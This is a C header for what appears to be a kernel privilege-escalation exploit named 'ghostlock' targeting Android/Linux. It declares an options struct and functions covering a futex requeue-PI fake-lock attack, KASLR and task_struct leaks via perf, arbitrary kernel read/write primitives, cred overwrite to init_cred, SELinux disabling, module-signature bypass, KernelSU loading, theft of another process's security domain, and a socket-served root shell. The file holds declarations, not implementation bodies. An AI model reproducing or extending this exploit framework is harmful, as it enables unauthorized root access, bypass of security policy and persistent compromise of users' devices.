#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE

#include "offset.h"

#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/futex.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "util.h"

/* Syscall numbers that may be missing from old cross headers. */
#ifndef SYS_rseq
#define SYS_rseq 733
#endif
#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif
#define CORE 0
#define MCAST_OPT_LEN 0x108
#define MCAST_WAITER_OFF_DEFAULT 0xb0
#define SLIDE_EARLY_WAKE_SIGNAL SIGUSR2

/* ------------------------------------------------------------------ */
/* runtime options (parsed from argv in main.c)                        */

struct ghostlock_opts {
  uint64_t kaslr_base;     /* runtime _stext override; 0 = perf leak      */
  uint64_t fake_lock_addr; /* private fake-lock page; 0 = target default  */
  int fake_lock_empty_zero; /* use empty_zero_page slots for the fake lock */
  uint64_t do_futex_waiter_off; /* waiter offset from sampled do_futex SP */
  uint64_t mcast_waiter_off; /* fake waiter offset inside group_source_req */
  const char *log_file;    /* persistent log sink (--log-file)            */
  int attempts;            /* max write-test attempts                     */
  int wait_seconds;        /* FUTEX_WAIT_REQUEUE_PI timeout               */
  int leak_timeout_seconds;/* extra child budget for perf waiter leak      */
  int requeue_ms;          /* delay before FUTEX_CMP_REQUEUE_PI            */
  int rt_prio;             /* waiter SCHED_FIFO prio; <=0 = stay CFS      */
  int probe_cycle;         /* value-based PI cycle (kernel.patched/QEMU)  */
  int fake_lock_window;    /* place fake lock in the MCAST stack window   */
  int fake_lock_probed;    /* recover the waiter address from the stack   */
  int skip_copy_probe;     /* use the CLI MCAST offset without calibration */
  int spin_park;           /* busy-spin after MCAST; enter no more syscalls */
  int select_carrier;      /* shape the waiter through select(stack_fds) */
  int self_trigger;        /* carrier performs its own sched_setattr walk */
  int waiter_task_own;     /* use perf-leaked waiter task, not init_task  */
  int noconsume;           /* encode payload but skip the trigger walk    */
  int no_early_signal;     /* let WAIT_REQUEUE_PI reach its timeout        */
  int hold;                /* SIGSTOP the child instead of killing it     */
  int detach;              /* child stays paused forever                  */
  int fsync;               /* fsync the log on final-result lines         */
  int verify_write;        /* run the MCAST write test (else leak only)   */
  int verify_leaf;         /* run the leaf (zero) write test              */
  int verify_read;         /* run the read primitive test                 */
  int verify_uuid;         /* boot_id-independent UUID read/write test    */
  int verify_safe;         /* consume with noop/BSS-only write tests      */
  int safe_leaf_only;      /* run only the safe leaf shape (debugging)    */
  int safe_pointer_only;   /* run only the safe pointer shape (debugging) */
  int leak_task;           /* only leak current task_struct candidates     */
  int leak_task_pid;       /* remote perf task leak for a specific TID     */
  int read8;               /* one arbitrary kernel read through boot_id    */
  uint64_t read8_target;
  int task_percpu;          /* attach task sampler to the selected CPU     */
  int runtime_cpu_override; /* force waiter sampler/affinity CPU, <0 = auto */
  int task_sample_period;   /* task sampler period in ns                   */
  int task_trigger_iters;   /* scheduler transitions per task leak run     */
  int task_rounds;          /* read-only task leak retries                  */
  int verify_all;          /* write + leaf + read + restore                */
  int restore_bootid;      /* restore boot_id data pointer after a crash  */
  int escalate;            /* leak our task + point cred at init_cred     */
  int cred_only;           /* point only current->cred at init_cred       */
  int simple_root;         /* uid/gid edit + setresuid, retain shell SID  */
  int sid_probe;           /* root then read and print the live SELinux SID */
  int module_prep;         /* disable signature and module-load policy    */
  int no_cap_bounding;     /* leave the shell bounding set unchanged      */
  int fire_and_forget;     /* do not wait on the child result pipe        */
  int ksu_load;            /* one-shot root + module load + late-load     */
  const char *ksu_module;  /* pre-relocated module path on the device     */
  const char *ksu_manager; /* KernelSU-Next libksud.so path               */
  const char *ksu_package; /* manager package name                        */
  int kernel_domain;       /* add capabilities and init_cred SELinux SID  */
  int kernel_domain_probe; /* run filesystem/mount/exec diagnostics       */
  int target_domain_pid;   /* steal this process's SELinux security blob   */
  const char *target_domain_comm; /* expected target process comm         */
  int serve_target_domain_pid; /* switch su-server cred to this process SID */
  uint64_t target_task_addr; /* known target task_struct from perf probe  */
  int target_only;         /* apply target domain to the current root cred */
  int target_shell;        /* keep vold-cred parent and exec toybox sh     */
  int bench;               /* --bench N: success-rate measurement         */
  int harden;              /* leaf-zero panic_on_oops (risk reduction)    */
  int selinux_relax;       /* disarm SELinux policy and drain stale AVC   */
  int poke_pointer;        /* one explicit pointer-shaped kernel write    */
  uint64_t poke_target;    /* --poke-pointer target address               */
  uint64_t poke_value;     /* --poke-pointer value address                */
  int poke_zero;           /* one explicit aligned zero write             */
  int su_server;           /* escalate, then serve @gl_su                 */
  int serve_only;          /* serve using the current (already root) cred */
  int su_selftest;         /* escalate + server + client round trip       */
  int serve_count;         /* max su requests to serve (0 = unlimited)    */
  const char *rsh_cmd;     /* --rsh CMD: run the client side              */
  int rsh_shell;           /* relay an interactive root shell             */
  const char *shell_path;  /* server shell (default /system/bin/sh)       */
  const char *socket_name; /* abstract socket name (default gl_su)        */
  int tcp_port;            /* loopback TCP broker port; 0 = abstract Unix */
  int kernel_shell;        /* exec an interactive shell after kernel SID  */
  const char *slot_file;   /* fake-lock slot ledger (default             */
                           /*   /data/local/tmp/gl.slot; "" = in-process) */
};

extern struct ghostlock_opts g_opts;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

/* ------------------------------------------------------------------ */
/* state                                                               */

extern int runtime_cpu;          /* fastest allowed CPU (util.c)       */
extern uint64_t kaslr_base;      /* runtime _stext                     */
extern uint64_t kaslr_slide;     /* kaslr_base - KIMAGE_STEXT_LINK     */

/* ------------------------------------------------------------------ */
/* util.c                                                              */

int init_runtime_cpu(void);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void log_slide_child_context(void);
void disable_rseq_for_thread(void);
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t canon_addr(uintptr_t image_addr);
void ghostlock_log_init(const char *path, int fsync_flag);

/* ------------------------------------------------------------------ */
/* perf.c                                                              */

uint64_t perf_leak_stext(void);
uint64_t perf_leak_waiter(uint64_t do_futex_waiter_off);
extern char perf_waiter_diag[256];
extern uint64_t perf_mcast_copy_address;
extern int perf_mcast_waiter_offset;
int perf_mcast_probe_begin(void);
uint64_t perf_mcast_probe_end(void);
int perf_wait_waiter_probe_begin(void);
uint64_t perf_wait_waiter_probe_end(void);
int perf_remove_waiter_probe_begin(void);
uint64_t perf_remove_waiter_probe_end(void);
uint64_t perf_probe_mcast_copy_address(uint64_t waiter_address);

/* perf-based current-task leak (sample __schedule, x27 = sp_el0) */
#define PERF_TASK_CAND_MAX 16
extern uint64_t perf_task_cand[PERF_TASK_CAND_MAX];
extern unsigned perf_task_cnt[PERF_TASK_CAND_MAX];
extern int perf_task_ncand;
extern uint64_t perf_task_user_cand;
uint64_t perf_leak_task(void);
uint64_t perf_leak_task_pid(pid_t target_pid);

/* ------------------------------------------------------------------ */
/* slide.c                                                             */

int slide_run_write_test(void);
int slide_run_leaf_test(void);
int slide_run_read_test(void);
int slide_run_uuid_test(void);
int slide_run_safe_test(void);
int slide_run_leak_task(void);
int slide_run_leak_task_pid(int target_pid);
int slide_run_read8(uint64_t target);
int slide_run_verify_all(void);
int slide_run_restore_bootid(void);
int slide_run_escalate(void);
int slide_run_cred_only(void);
int slide_run_simple_root(void);
int slide_run_current_sid_probe(void);
int slide_run_module_prep(void);
int slide_grant_live_capabilities(void);
int slide_read_modules_disabled(uint32_t *value);
int slide_set_current_init_user_ns(void);
int slide_set_current_sid_zero(void);
int slide_set_current_target_domain(int target_pid, const char *target_comm);
int slide_run_target_uevent(void);
int slide_avc_grant_module_permission(uint32_t sid, uint16_t tclass);
int slide_avc_clear_bucket(uint32_t sid, uint16_t tclass);
int slide_run_selinux_uninit(void);
int slide_restore_selinux_initialized(void);
int slide_run_kernel_domain(void);
int slide_run_kernel_sid_only(void);
int slide_run_target_init_self(void);
int slide_run_bench(int n);
int slide_run_harden(void);
int slide_run_selinux_permissive(void);
int slide_run_module_sig_disable(void);
int slide_run_module_ready(void);
int slide_run_selinux_relax(void);
int slide_run_poke_pointer(uint64_t target, uint64_t value);
int slide_run_poke_zero(uint64_t target);
int slide_run_target_only(int target_pid, const char *target_comm,
                          uint64_t target_task);

/* ------------------------------------------------------------------ */
/* su.c (mrx-w09 style su/broker channel)                              */

int su_run_server(void);
int su_run_ksu_load(void);
int su_run_selftest(void);
int su_run_client(const char *cmd);
int su_run_shell_client(void);

extern uint64_t slide_root_cred;

/* ------------------------------------------------------------------ */
/* main.c                                                              */

int run_exploit(int argc, char **argv);

#endif
